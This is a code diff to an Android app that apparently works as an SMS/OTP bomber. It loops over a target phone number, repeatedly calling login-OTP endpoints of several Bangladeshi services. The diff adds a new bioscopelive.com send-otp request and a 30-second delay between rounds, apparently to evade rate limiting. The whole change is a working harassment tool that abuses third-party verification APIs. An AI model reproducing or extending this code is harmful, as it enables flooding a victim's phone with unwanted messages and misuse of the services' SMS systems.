@@ -24,6 +24,7 @@ import org.json.JSONObject;
 
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Random;
 
 public class MainActivity extends AppCompatActivity  implements View.OnClickListener {
 
@@ -54,13 +55,14 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
         try {
             if (v.getId()==R.id.click)
             {
-
                 String mobile = editTex1.getText().toString();
                 int amount = Integer.parseInt(editText2.getText().toString());
                 for(int i=0;i<amount;i++){
                     swapnoApi(mobile);
                     blshopApi(mobile);
                     bongobdApi(mobile);
+                    bioscopeApi(mobile);
+                    Thread.sleep(30000);
                 }
                 Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();
                 //Toast.makeText(MainActivity.this,"Button pressed",Toast.LENGTH_LONG).show();
@@ -172,6 +174,26 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
         // below line is to make
         // a json object request.
         queue.add(request);
+    }
+    private void bioscopeApi(String mobile){
+        String url = String.valueOf("https://www.bioscopelive.com/bn/login/send-otp?phone=88"+mobile+"&operator=bd-otp");
+        boolean flag = false;
+        RequestQueue queue = Volley.newRequestQueue(this);
+        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
+                new Response.Listener<String>() {
+                    @Override
+                    public void onResponse(String response) {
+                        // enjoy your response
+                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();
+
+                    }
+                }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                // enjoy your error status
+            }
+        });
+        queue.add(stringRequest);
     }
 
     private boolean isNetworkAvailable() {
